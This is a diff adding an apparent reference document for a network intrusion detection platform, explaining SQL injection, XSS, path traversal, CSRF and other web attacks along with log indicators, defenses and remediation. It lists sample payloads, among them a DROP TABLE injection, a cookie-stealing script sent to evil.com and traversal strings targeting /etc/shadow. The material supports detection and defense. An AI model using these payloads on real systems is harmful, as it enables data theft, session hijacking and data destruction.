@@ -1,0 +1,194 @@
+Web Attack Types and Defense Techniques
+
+This document covers the three attack types detected by this NIDS platform (SQL Injection, XSS, Directory Traversal) plus additional common web attacks, with detailed technical explanations and countermeasures.
+
+
+SQL Injection (SQLi)
+* Definition: An attack where malicious SQL code is inserted into an input field to manipulate database queries.
+* Risk level: Critical - can lead to full database compromise, authentication bypass, and data exfiltration.
+* How it works:
+   * Web applications construct SQL queries using user-supplied input without proper sanitisation
+   * Attacker injects SQL syntax to change the meaning of the query
+   * The database executes the attacker's modified query
+
+* Common SQLi types:
+   * Classic / In-band SQLi: Results returned directly in HTTP response
+      * Union-based: Uses UNION SQL operator to return data from other tables
+      * Error-based: Exploits database error messages to extract information
+   * Blind SQLi: No visible output; attacker infers data from application behaviour
+      * Boolean-based: Sends queries that return true/false
+      * Time-based: Uses SLEEP() or WAITFOR DELAY to infer data from response time
+   * Out-of-band SQLi: Uses alternative channel (DNS, HTTP request) to exfiltrate data
+
+* Common payloads:
+   * ' OR 1=1 --                        (authentication bypass)
+   * ' OR '1'='1                         (authentication bypass variant)
+   * admin' --                           (comment out password check)
+   * ' UNION SELECT null, username, password FROM users --  (data extraction)
+   * '; DROP TABLE users; --             (destructive)
+   * ' AND SLEEP(5) --                   (time-based blind)
+
+* Target fields: Login forms, search boxes, product IDs in URLs, any input sent to database
+* Indicators in logs: Single quotes, SQL keywords (OR, UNION, SELECT, DROP), double dashes, URL-encoded equivalents (%27 = ', %20 = space)
+
+* Defense:
+   * Parameterised queries (prepared statements) - primary defense
+   * Stored procedures (when implemented safely)
+   * Input validation - allowlist expected characters
+   * Escape all user-supplied input
+   * Principle of least privilege for database accounts
+   * Web Application Firewall (WAF) to filter malicious requests
+   * Disable detailed database error messages in production
+   * Regular security testing: SQLMAP, manual testing
+
+* Remediation steps after SQLi attack detected:
+   1. Immediately block the source IP
+   2. Review database logs for unauthorised queries
+   3. Check if any data was exfiltrated
+   4. Rotate database credentials
+   5. Review and fix vulnerable code using parameterised queries
+   6. Perform full security audit of all input fields
+
+
+Cross-Site Scripting (XSS)
+* Definition: An attack where malicious scripts are injected into web pages viewed by other users. The victim's browser executes the attacker's script.
+* Risk level: High - can lead to session hijacking, credential theft, and malware distribution.
+* How it works:
+   * Application includes unvalidated and unencoded user input in its output
+   * Attacker's script runs in victim's browser with same trust as the legitimate site
+   * Script can read cookies, make requests on user's behalf, redirect to phishing sites
+
+* XSS types:
+   * Stored (Persistent) XSS:
+      * Malicious script is stored in database and served to all users who visit the page
+      * Most dangerous - affects all users, not just one
+      * Common in comment sections, forum posts, user profiles
+   * Reflected (Non-Persistent) XSS:
+      * Malicious script is in the HTTP request, reflected back in response
+      * Requires victim to click a crafted link
+      * Common in search results, error messages
+   * DOM-based XSS:
+      * Vulnerability exists in client-side code, not server-side
+      * Attack payload never reaches server
+      * Exploits JavaScript that writes user-controlled data to DOM
+
+* Common payloads:
+   * <script>alert('XSS')</script>                          (basic test)
+   * <script>document.location='http://evil.com/steal?c='+document.cookie</script>  (cookie theft)
+   * <img src=x onerror=alert(1)>                           (event handler bypass)
+   * <svg onload=alert(1)>                                   (SVG vector)
+   * javascript:alert(1)                                     (in href attributes)
+   * <iframe src="javascript:alert(1)">                      (iframe vector)
+
+* Indicators in logs: <script>, <img>, <svg>, <iframe> tags, javascript:, onerror=, onload=, alert(), URL-encoded equivalents (%3Cscript%3E)
+
+* Defense:
+   * Output encoding - encode all user input before rendering in HTML
+   * Content Security Policy (CSP) - restrict script sources
+   * Input validation - reject unexpected characters
+   * HttpOnly cookie flag - prevents JavaScript from reading session cookies
+   * Secure cookie flag - cookies only sent over HTTPS
+   * X-XSS-Protection header (legacy browsers)
+   * Use modern frameworks that auto-escape by default (React, Angular, Vue)
+
+* Remediation after XSS attack detected:
+   1. Block source IP
+   2. Invalidate all active sessions (attacker may have stolen session tokens)
+   3. Notify users to change passwords
+   4. Find and fix the vulnerable input/output point
+   5. Implement CSP headers
+   6. Audit all user-controlled data rendering points
+
+
+Directory Traversal (Path Traversal)
+* Definition: An attack that allows access to files and directories stored outside the web root folder by manipulating file path variables.
+* Risk level: Medium to High - can expose sensitive server files including configuration, credentials, and source code.
+* How it works:
+   * Application uses user input to construct file paths without proper validation
+   * Attacker uses ../ sequences to navigate outside the intended directory
+   * Server reads and returns files it should not expose
+
+* Common payloads:
+   * ../../../etc/passwd                 (Unix password file)
+   * ../../../etc/shadow                 (Unix shadow password file)
+   * ../../../windows/win.ini            (Windows system file)
+   * ../../../windows/system32/drivers/etc/hosts
+   * ....//....//....//etc/passwd        (double encoding bypass)
+   * ..%2F..%2F..%2Fetc%2Fpasswd        (URL encoding bypass)
+   * %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd  (double URL encoding)
+
+* Target parameters: file=, page=, path=, doc=, template=, lang= in URLs and POST data
+* Indicators in logs: ../ sequences, %2e%2e, %2f, /etc/passwd, /etc/shadow, win.ini
+
+* Defense:
+   * Validate user-supplied input against an allowlist of permitted values
+   * Use indirect object references - map user input to actual file paths server-side
+   * Canonicalise paths before validation - resolve all ../ sequences first
+   * Chroot / jail the application to limit filesystem access
+   * Configure web server to reject requests containing ../ sequences
+   * Implement proper file permissions on the server
+
+* Remediation after Directory Traversal detected:
+   1. Block source IP
+   2. Check access logs for files that may have been accessed
+   3. Rotate any credentials that may have been exposed
+   4. Patch the vulnerable file inclusion code
+   5. Review server file permissions
+
+
+Brute Force Attacks
+* Definition: Attacker systematically tries all possible passwords or encryption keys until the correct one is found.
+* Types:
+   * Simple brute force: Try all combinations
+   * Dictionary attack: Use a list of common passwords
+   * Credential stuffing: Use username/password pairs from previous data breaches
+   * Password spraying: Try one common password against many accounts
+* Indicators: Multiple failed login attempts from same IP, failed logins across many accounts from same IP
+* Defense:
+   * Account lockout after N failed attempts
+   * CAPTCHA on login forms
+   * Multi-factor authentication (MFA)
+   * Rate limiting on authentication endpoints
+   * IP-based blocking after repeated failures (same as this NIDS platform does)
+   * Notify users of failed login attempts
+
+
+HTTP Request Smuggling
+* Definition: Attack that exploits discrepancies in how front-end and back-end servers parse HTTP requests.
+* Impact: Bypass security controls, hijack other users' requests, cache poisoning
+* Prevention: Keep server software updated, ensure consistent HTTP parsing configuration
+
+
+CSRF (Cross-Site Request Forgery)
+* Definition: Attack that tricks authenticated users into submitting a request to a web application against their will.
+* Example: Attacker embeds <img src="http://bank.com/transfer?to=attacker&amount=1000"> on a malicious page. When victim visits, their browser silently makes the request.
+* Defense:
+   * CSRF tokens (synchroniser token pattern)
+   * SameSite cookie attribute
+   * Verify Origin and Referer headers
+   * Require user interaction for sensitive actions
+
+
+Clickjacking
+* Definition: Attack that tricks users into clicking on something different from what they perceive, by embedding the target page in an invisible iframe.
+* Defense:
+   * X-Frame-Options: DENY or SAMEORIGIN header
+   * Content-Security-Policy: frame-ancestors directive
+
+
+Security Headers Reference
+* Strict-Transport-Security (HSTS): Force HTTPS
+* Content-Security-Policy (CSP): Control resource loading
+* X-Content-Type-Options: nosniff - prevent MIME sniffing
+* X-Frame-Options: Prevent clickjacking
+* Referrer-Policy: Control referrer information
+* Permissions-Policy: Control browser features
+
+
+Web Application Firewall (WAF)
+* Definition: A security solution that monitors, filters, and blocks HTTP traffic to and from a web application.
+* How it works: Inspects HTTP requests against a ruleset; blocks requests matching attack signatures
+* ModSecurity: Open-source WAF, commonly used with Apache/Nginx
+* OWASP Core Rule Set (CRS): Free ruleset for ModSecurity covering OWASP Top 10
+* Limitations: Can be bypassed with obfuscation; not a substitute for secure coding
+* This NIDS platform's Apache IP blocking via .htaccess is a lightweight WAF-like enforcement layer
